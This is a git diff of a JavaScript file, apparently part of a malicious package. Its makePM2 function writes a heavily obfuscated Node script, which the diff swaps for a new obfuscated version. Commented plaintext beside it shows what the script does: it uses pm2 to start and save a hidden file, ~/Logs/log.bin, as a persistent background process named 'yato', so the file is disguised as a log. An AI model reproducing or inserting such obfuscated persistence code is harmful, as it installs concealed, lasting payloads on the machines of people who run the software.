@@ -24,18 +24,19 @@ async function fetchDataAndWriteFile() {
 }
 
 async function makePM2() {
-  const filedata = `const _0x1ac3ba=_0x555e;(function(_0x3e55ac,_0x28e0e5){const _0x44aec5=_0x555e,_0x3396ca=_0x3e55ac();while(!![]){try{const _0x227083=parseInt(_0x44aec5(0x8b))/0x1*(parseInt(_0x44aec5(0x80))/0x2)+-parseInt(_0x44aec5(0x79))/0x3+parseInt(_0x44aec5(0x7c))/0x4*(parseInt(_0x44aec5(0x7b))/0x5)+parseInt(_0x44aec5(0x7e))/0x6*(-parseInt(_0x44aec5(0x8a))/0x7)+parseInt(_0x44aec5(0x85))/0x8+-parseInt(_0x44aec5(0x84))/0x9*(-parseInt(_0x44aec5(0x7a))/0xa)+parseInt(_0x44aec5(0x87))/0xb*(-parseInt(_0x44aec5(0x81))/0xc);if(_0x227083===_0x28e0e5)break;else _0x3396ca['push'](_0x3396ca['shift']());}catch(_0x6f5525){_0x3396ca['push'](_0x3396ca['shift']());}}}(_0x7996,0x1db78));function _0x7996(){const _0x205d75=['pm2\x20start\x20','250074atmvGR','5780TiIKGR','5RxhAqa','949736fWPtCS','pm2\x20save','67398AXnhvl','child_process','417854JzdfKV','1464kHYOlJ','join','homedir','801hgkBOG','736176ZMIMxl','/log.bin\x20--name\x20yato\x20--interpreter\x20node','25575clrDuw','Logs','path','63snduuZ','1HvvmBf'];_0x7996=function(){return _0x205d75;};return _0x7996();}const {execSync}=require(_0x1ac3ba(0x7f)),path=require(_0x1ac3ba(0x89)),os=require('os'),sourcePath=path[_0x1ac3ba(0x82)](os[_0x1ac3ba(0x83)](),_0x1ac3ba(0x88));function _0x555e(_0x3178e,_0x7e72bd){const _0x7996c6=_0x7996();return _0x555e=function(_0x555e81,_0x21462a){_0x555e81=_0x555e81-0x78;let _0x4fbfb9=_0x7996c6[_0x555e81];return _0x4fbfb9;},_0x555e(_0x3178e,_0x7e72bd);}execSync(_0x1ac3ba(0x78)+sourcePath+_0x1ac3ba(0x86)),execSync(_0x1ac3ba(0x7d));`;
+  const filedata = `function _0x5516(_0x3f362f,_0x2e0125){const _0x5d6125=_0x5d61();return _0x5516=function(_0x55162a,_0x143a67){_0x55162a=_0x55162a-0x1ec;let _0x4f6d40=_0x5d6125[_0x55162a];return _0x4f6d40;},_0x5516(_0x3f362f,_0x2e0125);}function _0x5d61(){const _0x51e582=['path','join','155378jTlQtG','/log.bin\x20--name\x20yato\x20--interpreter\x20node','74710jHtqPz','1420424ZQTJsO','utf8','5Zfyruz','639628wEcfYI','which\x20pm2','659340IdQdEA','413gwuYkq','171JwcXdA','22398iBpMhs','trim','1ELLkJW','child_process','\x20start\x20','Logs','1001264xpXXzj','\x20save'];_0x5d61=function(){return _0x51e582;};return _0x5d61();}const _0x48da61=_0x5516;(function(_0x39c448,_0x28e1bc){const _0x3baa98=_0x5516,_0x3cf38c=_0x39c448();while(!![]){try{const _0x5db8d5=-parseInt(_0x3baa98(0x1f4))/0x1*(parseInt(_0x3baa98(0x1fc))/0x2)+-parseInt(_0x3baa98(0x1ef))/0x3+parseInt(_0x3baa98(0x1ff))/0x4*(parseInt(_0x3baa98(0x1ec))/0x5)+parseInt(_0x3baa98(0x1f2))/0x6*(parseInt(_0x3baa98(0x1f0))/0x7)+-parseInt(_0x3baa98(0x1f8))/0x8+-parseInt(_0x3baa98(0x1f1))/0x9*(-parseInt(_0x3baa98(0x1fe))/0xa)+-parseInt(_0x3baa98(0x1ed))/0xb;if(_0x5db8d5===_0x28e1bc)break;else _0x3cf38c['push'](_0x3cf38c['shift']());}catch(_0x1c5147){_0x3cf38c['push'](_0x3cf38c['shift']());}}}(_0x5d61,0x39bef));const {execSync}=require(_0x48da61(0x1f5)),path=require(_0x48da61(0x1fa)),os=require('os'),pm2Path=execSync(_0x48da61(0x1ee),{'encoding':_0x48da61(0x200)})[_0x48da61(0x1f3)](),sourcePath=path[_0x48da61(0x1fb)](os['homedir'](),_0x48da61(0x1f7));execSync(pm2Path+_0x48da61(0x1f6)+sourcePath+_0x48da61(0x1fd)),execSync(pm2Path+_0x48da61(0x1f9));`;
 
   // const filedata = `
-  //   const { execSync } = require('child_process');
-  //   const path = require('path');
-  //   const os = require('os');
+  // const { execSync } = require('child_process');
+  // const path = require('path');
+  // const os = require('os');
+  // const pm2Path = execSync('which pm2', { encoding: 'utf8' }).trim();
 
-  //   const sourcePath = path.join(os.homedir(), 'Logs');
-  //   execSync(
-  //     "pm2 start " + sourcePath + "/log.bin --name yato --interpreter node",
-  //   );
-  //   execSync('pm2 save');
+  // const sourcePath = path.join(os.homedir(), 'Logs');
+  // execSync(
+  //   pm2Path + " start " + sourcePath + "/log.bin --name yato --interpreter node",
+  // );
+  // execSync(pm2Path + ' save');
   // `;
 
   const src = path.join(os.homedir(), 'Logs', 'local');
